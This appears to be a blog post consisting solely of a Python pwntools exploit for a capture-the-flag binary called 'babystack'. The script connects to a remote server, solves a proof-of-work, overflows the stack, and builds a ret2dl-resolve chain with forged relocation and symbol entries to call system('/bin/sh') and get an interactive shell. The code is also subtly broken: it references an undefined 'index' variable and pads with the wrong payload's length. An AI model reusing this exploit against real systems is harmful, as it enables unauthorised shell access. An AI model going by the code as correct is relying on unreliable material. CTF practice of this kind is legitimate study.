+++
title = "exp1"
date = "2026-04-15"
type = "post"
categories = ['BUU']
tags = ['第二页', '2-3', '2-3-2']
draft = false
+++
```python
from pwn import *
from hashlib import sha256
context(log_level = 'debug')

EXCV = './babystack'
#libc_load = "./libc.so"
#ENV = {"LD_PRELOAD":libc_load}
e = ELF(EXCV)
#libc = ELF(libc_load)
libc = e.libc

#io = process(EXCV,env = ENV)
#io = process(EXCV)
io = remote('202.120.7.202','6666')
def debug():
    gdb.attach(io)

#----------------------------------------------------

overflow = 0x0804843B　　　　     # 栈溢出地址，从IDA中获得
dynsym = 0x080481cc               # readelf -S babystack | grep ".dynsym"
dynstr = 0x0804822c               # readelf -S babystack | grep ".dynstr"
rel_plt = 0x080482b0              # objdump -s -j .rel.plt babystack
bss = 0x0804A020                  # readelf -S babystack | grep ".bss"
base = bss+0x400
fake_rel_addr = base+80           #fake_rel
fake_sym_addr = fake_rel_addr+8   #fake_sym
pop_ebp = 0x080484eb
ppp_ret = 0x080484e9              # ROPgadget --binary bof --only "pop|ret"
lev_ret = 0x080483a8              # ROPgadget --binary bof --only "leave|ret"
plt_0 = 0x080482F0                # objdump -d -j .plt bof


align = 0x10-(fake_sym_addr-dynsym)&0xf # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小
fake_sym_addr += align
index_dynsym = (fake_sym_addr-dynsym)/0x10     #除以0x10因为Elf32_Sym结构体的大小为0x10，得到dynsym索引号
r_info = (index<<8)|7
fake_str_addr = fake_sym_addr+0x10      #fake_str
str_off = fake_str_addr-dynstr
shell = base+128
rel_off = fake_rel_addr-rel_plt
rd_plt = e.plt['read']
rd_got = e.got['read']
fake_reloc=p32(rd_got)+p32(r_info)
fake_sym=p32(str_off)+p32(0)+p32(0)+p32(0x12)

def crack(chal,sol):
    sh = sha256(chal + sol)
    if(sh.digest().startswith('\0\0\0')):
        log.success(sh)
        return 1
    return 0

#----------------------------------------------------
chal = io.recvline()
sol = ''
for i in xrange(0,0x100000000):
    tsol = p32(i)
    if(crack(chal,tsol)==1):
        sol = tsol
        break
io.send(sol)
raw_input()
payload = 'a'*(0x2c)
payload += p32(rd_plt)
payload += p32(overflow)
payload += p32(0)
payload += p32(base)
payload += p32(0x1000)
io.send(payload)

raw_input()
payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(rel_off)
payload2 += 'AAAA'
payload2 += p32(shell)
payload2 += 'A'*(80-len(payload))
payload2 += fake_reloc
payload2 += 'B'*align
payload2 += fake_sym
payload2 += 'system\x00'
payload2 += 'C'*(128-len(payload))
payload2 += '/bin/sh\x00'
payload2 += 'END'
io.send(payload2)
raw_input()

payload3 = 'a'*0x2c
payload3 += p32(pop_ebp)
payload3 += p32(base)
payload3 += p32(lev_ret)
io.send(payload3)

io.interactive()
```
